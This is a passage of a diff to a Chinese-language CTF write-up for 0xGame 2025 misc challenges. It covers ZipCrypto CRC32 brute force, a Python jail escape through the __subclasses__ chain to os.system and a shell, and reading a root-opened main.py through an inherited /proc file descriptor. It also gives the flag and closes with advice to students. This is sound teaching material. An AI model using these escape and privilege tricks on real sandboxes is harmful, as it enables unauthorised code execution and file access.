+  * **文件数据（File Data）**：这是文件本身的内容，经过压缩和加密。
+
+  * **文件元数据（Metadata/Header）**：这是描述文件信息的数据，比如文件名、原始大小、压缩后的大小，以及最重要的——**原始文件（未加密前）的 CRC32 校验码**。
+
+* **致命缺陷**：在使用传统的 ZipCrypto 加密时，**文件数据本身是被加密的，但包含 CRC32 值的这部分元数据却是以明文形式存储的，没有被加密**。
+
+***
 
 回到这一部分讲解的 crc32 爆破攻击，它有局限性，这种攻击主要针对的是`ZipCrypto`算法，然后文件的未压缩大小都应该足够小，最好是 6 字节以下
 
 关注的是这一部分，用 bandzip 或其他 zip 解压工具也能看到，基本上都叫做**原始大小**
-
-<img src="/img/0xgame2025/image-20251016215834680.png" alt="image-20251016215834680" style="zoom:50%;" />
 
 仔细关注的话，会发现我压缩包里面出现小文件的大小稍微有点随机，有 1 字节和 3 字节，还有两个其他文件
 
@@ -2835,8 +2720,6 @@ yolo@yolo:~/Desktop/timu/0xGame/开锁师傅$
 
 > 这里就留个截图好了
 
-<img src="/img/0xgame2025/image-20251016222641099.png" alt="image-20251016222641099" style="zoom:50%;" />
-
 ### Jail 大逃亡
 
 > 打了 moe 的 Jail3，突发奇想，想读取 main.py，发现这里的权限是完全不可读的，不过看看进程，就有了法子🤭
@@ -2863,21 +2746,21 @@ def jail():
 
 这类显然是打继承链了，核心思路是：
 
-- **找到一个可以利用的对象：** 在当前受限的环境中，寻找一个能够访问其类的对象。通常这个对象会是一个内置类型（如字符串、列表、元组等）或一个函数。
+* **找到一个可以利用的对象：** 在当前受限的环境中，寻找一个能够访问其类的对象。通常这个对象会是一个内置类型（如字符串、列表、元组等）或一个函数。
 
-- **获取该对象的类（`__class__`）：** 利用 `.__class__` 属性获取该对象的类型。
+* **获取该对象的类（**`__class__`**）：** 利用 `.__class__` 属性获取该对象的类型。
 
-- **获取基类（`__base__` 或 `__bases__`）：** 通过类的 `.__base__` (单个基类) 或 `.__bases__` (所有基类组成的元组) 属性，向上追溯继承链，直到找到最顶层的基类 `object`。
+* **获取基类（**`__base__`**&#x20;或&#x20;**`__bases__`**）：** 通过类的 `.__base__` (单个基类) 或 `.__bases__` (所有基类组成的元组) 属性，向上追溯继承链，直到找到最顶层的基类 `object`。
 
-- **查找子类（`__subclasses__`）：** 一旦获得 `object` 类，就可以调用它的 `__subclasses__()` 方法，获得当前 Python 进程中**所有已加载的类**的列表。
+* **查找子类（**`__subclasses__`**）：** 一旦获得 `object` 类，就可以调用它的 `__subclasses__()` 方法，获得当前 Python 进程中**所有已加载的类**的列表。
 
-- **找到一个包含危险功能（如执行命令）的类：** 在 `__subclasses__()` 返回的列表中，寻找一个有用的类，例如：
+* **找到一个包含危险功能（如执行命令）的类：** 在 `__subclasses__()` 返回的列表中，寻找一个有用的类，例如：
 
-- - `warnings.catch_warnings`
-- - `subprocess.Popen`
-- - `os._wrap_close`
+* * `warnings.catch_warnings`
 
-<img src="/img/0xgame2025/image-20251016233110992.png" alt="image-20251016233110992" style="zoom:50%;" />
+* * `subprocess.Popen`
+
+* * `os._wrap_close`
 
 简单举例，你看，从基本的字符串向上追溯，显示获取字符串的类：`str`，然后获取基类：`object`，再向上直接可以获取所有子类：`subclasses`
 
@@ -2889,26 +2772,27 @@ def jail():
 
 这个 payload 很优雅吧
 
-<img src="/img/0xgame2025/1c81477683494d3d1a16c1bbb8946077.jpg" alt="1c81477683494d3d1a16c1bbb8946077" style="zoom:50%;" />
-
 #### payload 详细解剖
 
-- `''`,这是一个空字符串对象（可以看作我上面举例中用到的字符串对象'abc'，这是我们打继承链的起点
-- `.__class__`获取了空字符串的类，结果是`<class 'str'>`
-- `.__base__`获取 str 类的基类，结果是`<class 'object'>`,这里很关键，因为 object 类下的`__subclasses__`方法中有很多很多我们能用到的方法
+* `''`,这是一个空字符串对象（可以看作我上面举例中用到的字符串对象'abc'，这是我们打继承链的起点
+
+* `.__class__`获取了空字符串的类，结果是`<class 'str'>`
+
+* `.__base__`获取 str 类的基类，结果是`<class 'object'>`,这里很关键，因为 object 类下的`__subclasses__`方法中有很多很多我们能用到的方法
 
 接下来我使用了列表推导式查找到我们可以利用的方法
 
-- `for x in ......subclasswd......`，这里遍历了所有的类(x)
-- `if x.__name__=="_wrap_class"`,这里只保留了类名为`_wrap_close`的类，这个类在 python 中通常是`os._wrap_close`
-- `x.__init__.globals__`,这里对于我们筛选出来的类`(os._wrap_close)`获取其初始化方法`__init__`的全局命名空间，里面有一个关键的方法名 system，熟悉 python 执行 shell 命令的，一定见过 os.system()吧，就是这个意思
-- 我们使用那个列表推导式拿到的类里面，正常来说只有 os._wrap_close，所以用[0]索引就好了，将它 init 初始化得到全局字典里面有我们需要的方法名 system，然后调用执行系统命令，最后通过 sh 命令，就能拿到 shell，沙箱逃逸成功
+* `for x in ......subclasswd......`，这里遍历了所有的类(x)
+
+* `if x.__name__=="_wrap_class"`,这里只保留了类名为`_wrap_close`的类，这个类在 python 中通常是`os._wrap_close`
+
+* `x.__init__.globals__`,这里对于我们筛选出来的类`(os._wrap_close)`获取其初始化方法`__init__`的全局命名空间，里面有一个关键的方法名 system，熟悉 python 执行 shell 命令的，一定见过 os.system()吧，就是这个意思
+
+* 我们使用那个列表推导式拿到的类里面，正常来说只有 os._wrap_close，所以用[0]索引就好了，将它 init 初始化得到全局字典里面有我们需要的方法名 system，然后调用执行系统命令，最后通过 sh 命令，就能拿到 shell，沙箱逃逸成功
 
 #### pass root_privileges
 
 绕过 python jail，拿到 shell 后，发现有个文件的内容让我们想办法读取 main.py，但是当前我们是 nobody 这样的最低权限，不能读取，接下来的操作算是一个小型提权处理
-
-<img src="/img/0xgame2025/image-20251017154754089.png" alt="image-20251017154754089" style="zoom:50%;" />
 
 ```bash
 ~$ ps aux
@@ -2920,7 +2804,6 @@ nobody         9  0.0  0.0   2584   956 ?        S    08:10   0:00 sh
 nobody        10  0.0  0.0   8484  4208 ?        R    08:11   0:00 ps aux
 ~$ ls -la /proc/self/fd/4
 lrwx------ 1 nobody root 64 Oct 17 08:11 /proc/self/fd/4 -> /memfd:/app/main.py (deleted)
-
 ```
 
 注意看，这里由于配置不当，让 nobodyfork 了 main.py，这里考察的知识点是通过文件描述符 fd，读取对应的文件
@@ -2929,16 +2812,12 @@ lrwx------ 1 nobody root 64 Oct 17 08:11 /proc/self/fd/4 -> /memfd:/app/main.py 
 
 > moectf 上面，jail3 的出题师傅为了实现过验证和保护 main.py，将这个 py 进程给 fork 传递到其他地方了，但是他那边失误了一点，就是他让父进程使用了 `pass_fds=[self_fd]`，导致低权限的子进程**继承**了 FD 4 这个**已打开的文件句柄**。如果说他加了个中间脚本，就是说 fork 的内容是执行一个脚本，这个脚本再执行 main.py，有点难度，但是我也有法子解决，那就是用`os.write()`覆盖 fd 的文件内容，总之我目前的解决方案是取消父进程 fork，不过这样的话，就没考察的意义了呢，有点点小为难……有了，那里的`os.memfd_create()`改成`os.pipe()`,这样的 fd 描述符仅仅可读，然后呢，我再挂个中间文件，完美！
 
-<img src="/img/0xgame2025/image-20251017161331048.png" alt="image-20251017161331048" style="zoom:50%;" />
-
 然后怎么读取呢？这里 fork 的权限给了我们 nobody，但是直接读的话，会由于链接文件直接读取那个/app/main.py 了
 
 请注意，这里我们 fork 是从 root 用户执行文件后 fork 的，换言之，root 已经帮我们打开，并执行了程序，我们就完全可以接着 read 了，然后 read 的文件应该是`/proc/7/fd/4`!!!
 
-> 一些补充，在 Linux 中，对某些文件进行操作都是先 open 然后 read,比方说 Linux 的 cat 就是先 open 文件，再输出的，这里的 open 过程就是检查权限的一个过程
->
-> 我觉得我这里的举例很好
->
+> 一些补充，在 Linux 中，对某些文件进行操作都是先 open 然后 read,比方说 Linux 的 cat 就是先 open 文件，再输出的，这里的 open 过程就是检查权限的一个过程\
+> 我觉得我这里的举例很好\
 > 一个文件的操作分为打开，读取，操作，关闭，就比方说一个袋子用 root 先打开，然后在打开的状态下给 nobody，接下来 nobody 就绕过了打开的操作，这里的打开操作就是那个检查权限的过程
 
 然后在本环境中，推荐用 python 的封装语句
@@ -2949,13 +2828,13 @@ python -c "import os;os.lseek(4,0,0);print(os.read(4,90000).decode('latin1',erro
 
 #### 简单解释
 
-- **`import os`：** 导入 `os` 模块，以便使用底层文件操作函数。
+* `import os`**：** 导入 `os` 模块，以便使用底层文件操作函数。
 
-- **`os.lseek(4, 0, 0)`：** 将 FD 4 的读取指针**重置**到文件的开头（偏移量 0，从文件开头开始）。这是必要的，因为子进程在执行 Python 脚本时，读取指针很可能已经移到了文件末尾。
+* `os.lseek(4, 0, 0)`**：** 将 FD 4 的读取指针**重置**到文件的开头（偏移量 0，从文件开头开始）。这是必要的，因为子进程在执行 Python 脚本时，读取指针很可能已经移到了文件末尾。
 
-- **`os.read(4, 90000)`：** 从文件描述符 4 中读取最多 90000 字节的数据。(90000 我随便写的，肯定越多越能保证提取完整啊)
+* `os.read(4, 90000)`**：** 从文件描述符 4 中读取最多 90000 字节的数据。(90000 我随便写的，肯定越多越能保证提取完整啊)
 
-- **`.decode(...)`：** 将读取到的字节流解码为字符串并打印出来。
+* `.decode(...)`**：** 将读取到的字节流解码为字符串并打印出来。
 
 #### get flag
 
@@ -2968,8 +2847,6 @@ def flag_hint():
     IV='MEOHeAiC+BlLhH3FKhl0MQ=='
     Ciphertext='j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9'
     print("that's all,have fun!!!")
-
-
 ```
 
 很基础的 CBC 加密 aes，我看 Sean 在 week2 给你们出过，不管是写脚本还是在线工具，都很好解决
@@ -3023,32 +2900,28 @@ result: 0xGame{Contratulations!You_solved_pyjail!}
 
 > 这个人出的题，我不太想讲，需要的问他
 
-
-
----
+***
 
 ### To be continues
 
 Okey,看到这里，也就意味着整个 0xGame2025 结束咯，结合我给出的授课 pdf，大家应该收获了不少吧，下面是一些结束语……
 
-
-
 to 老赛棍：
 
-​	这是我第一次出题，难度上确实没把握住，难了不少吧（已经简化了呢，而且考察比较偏向原理、实战）
+​ 这是我第一次出题，难度上确实没把握住，难了不少吧（已经简化了呢，而且考察比较偏向原理、实战）
 
-​	是不是对你们来说，这次 misc 比较陌生？因为以往的五花八门的隐写，我不太喜欢，有些要对出题人脑洞，有些指定了某些妙妙小工具，至少在我看来，这种题就算解决了，成就感也不是很高，哈哈，并没有否定其他出题师傅的意思，每个人都有自己的出题风格吧，但是大家的目标都一样，通过一次又一次比赛，学习新的技能，为学弟学妹们更轻松入门 ctf 提供帮助。在后续的比赛中，愿和大家共勉，大家都是学习安全的，在追求更高更新的技术的路上，我们是对手也是同路人，顶峰见！
+​ 是不是对你们来说，这次 misc 比较陌生？因为以往的五花八门的隐写，我不太喜欢，有些要对出题人脑洞，有些指定了某些妙妙小工具，至少在我看来，这种题就算解决了，成就感也不是很高，哈哈，并没有否定其他出题师傅的意思，每个人都有自己的出题风格吧，但是大家的目标都一样，通过一次又一次比赛，学习新的技能，为学弟学妹们更轻松入门 ctf 提供帮助。在后续的比赛中，愿和大家共勉，大家都是学习安全的，在追求更高更新的技术的路上，我们是对手也是同路人，顶峰见！
 
----
+***
 
 to 学弟学妹们（校内外都算哦）：
 
-​	本次新生赛结束了，大家有没有体会到什么是网络安全呢？有没有体验到自己想象中的 hacker 生活呢？哈哈，是不是感觉被骗了（我当初也是这样想的）但是！！！这才是真正黑客要经历的道路，网上的那种戴面具的黑客才大骗子呢，超级圈钱大骗子
+​ 本次新生赛结束了，大家有没有体会到什么是网络安全呢？有没有体验到自己想象中的 hacker 生活呢？哈哈，是不是感觉被骗了（我当初也是这样想的）但是！！！这才是真正黑客要经历的道路，网上的那种戴面具的黑客才大骗子呢，超级圈钱大骗子
 
-​	如果你们认真从 week1 打到了 week4，我可以负责任的说，你们都已经入门 ctf 比赛（我们今年 0x 真的蛮有难度的，所以那些感觉分数较低的学弟学妹不要气馁，能坚持下来，你们已经甩了同届同学一大圈了（包括少数老登呢，我去年真的很菜很菜
+​ 如果你们认真从 week1 打到了 week4，我可以负责任的说，你们都已经入门 ctf 比赛（我们今年 0x 真的蛮有难度的，所以那些感觉分数较低的学弟学妹不要气馁，能坚持下来，你们已经甩了同届同学一大圈了（包括少数老登呢，我去年真的很菜很菜
 
-​	在你们后面的学习生活中，希望你们脚踏实地，遇到一个知识点，抽点时间钻研一二，那种工具题的话，可以简单看看 wp，了解下就 ok 了，对了，给你们推荐一篇[文章](https://goodlunatic.github.io/posts/1ad9200/)，博客作者是 Lunatic，我当初是看他的视频一步一步学习的，他真的好厉害，这篇文章是他为 misc 入门的新手们写的，你们解题遇到了没见过的考点，可以参考他的文章
+​ 在你们后面的学习生活中，希望你们脚踏实地，遇到一个知识点，抽点时间钻研一二，那种工具题的话，可以简单看看 wp，了解下就 ok 了，对了，给你们推荐一篇[文章](https://goodlunatic.github.io/posts/1ad9200/)，博客作者是 Lunatic，我当初是看他的视频一步一步学习的，他真的好厉害，这篇文章是他为 misc 入门的新手们写的，你们解题遇到了没见过的考点，可以参考他的文章
 
-​	学习安全是有个“捷径”的，那就是不断的参加 ctf 比赛，以赛代学，在这个路程中，几乎不会轻松，有时候一个知识点难住你一周也是有可能的，但是解决后收获的喜悦也是最高的，然后在路上，你会遇到更多技术佬，交流更深入更多的技术，但是一个人走，挺难，所以建议你们能找个搭子，建议同校优先，方便一起打打比赛，互相支持，走向更远
+​ 学习安全是有个“捷径”的，那就是不断的参加 ctf 比赛，以赛代学，在这个路程中，几乎不会轻松，有时候一个知识点难住你一周也是有可能的，但是解决后收获的喜悦也是最高的，然后在路上，你会遇到更多技术佬，交流更深入更多的技术，但是一个人走，挺难，所以建议你们能找个搭子，建议同校优先，方便一起打打比赛，互相支持，走向更远
 
-​	关于 AI 使用，一定要`合理使用`，我看了不少交上来的 wp，大部分是将 ai 给出的结论放到 wp 里面了，更有甚者，直接让 AI 给他写 wp,我读完，感觉很抽象，没有一点点“活人气息”，理解我的意思吧，我更希望大家后面学习，写 wp 的时候要写写自己的思考过程，这对出题人和自己都有好处（准确来说，wp 是给你自己写的，毕竟是你的来时路，还请重视下，不管是求职还是申请进入联合战队，一个优质的博客技术栈一定是面试中的加分项
+​ 关于 AI 使用，一定要`合理使用`，我看了不少交上来的 wp，大部分是将 ai 给出的结论放到 wp 里面了，更有甚者，直接让 AI 给他写 wp,我读完，感觉很抽象，没有一点点“活人气息”，理解我的意思吧，我更希望大家后面学习，写 wp 的时候要写写自己的思考过程，这对出题人和自己都有好处（准确来说，wp 是给你自己写的，毕竟是你的来时路，还请重视下，不管是求职还是申请进入联合战队，一个优质的博客技术栈一定是面试中的加分项
